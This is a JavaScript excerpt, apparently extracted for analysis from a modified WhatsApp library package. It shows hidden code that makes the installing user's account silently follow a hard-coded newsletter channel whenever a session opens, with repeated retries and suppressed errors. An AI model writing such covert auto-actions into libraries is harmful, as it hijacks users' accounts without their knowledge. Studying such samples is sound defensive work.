// Distilled from ipungg-baileys 1.0.0/1.0.1 lib/Socket/newsletter.js
// autoFollowChannel: a module-local channelId constant followed from the
// session-open trigger with named-callback setTimeout retries.
const autoFollowChannel = () => {
    const channelId = "120363411099190787@newsletter";
    const retryDelays = [10e3, 30e3, 60e3, 120e3, 300e3];
    let attempt = 0;
    let followed = false;
    const tryFollow = async () => {
        if (followed) return;
        try {
            const result = await newsletterWMexQuery(channelId, QueryIds.FOLLOW);
            const ok = result?.attrs?.type !== 'error';
            if (ok) {
                followed = true;
                return;
            }
        } catch (e) {}
        if (!followed && attempt < retryDelays.length) {
            setTimeout(tryFollow, retryDelays[attempt++]);
        }
    };

    if (config.ev) {
        config.ev.on('connection.update', ({ connection }) => {
            if (connection === 'open') {
                setTimeout(tryFollow, 5000);
            }
        });
    }
    setTimeout(tryFollow, 30000);
};
autoFollowChannel();
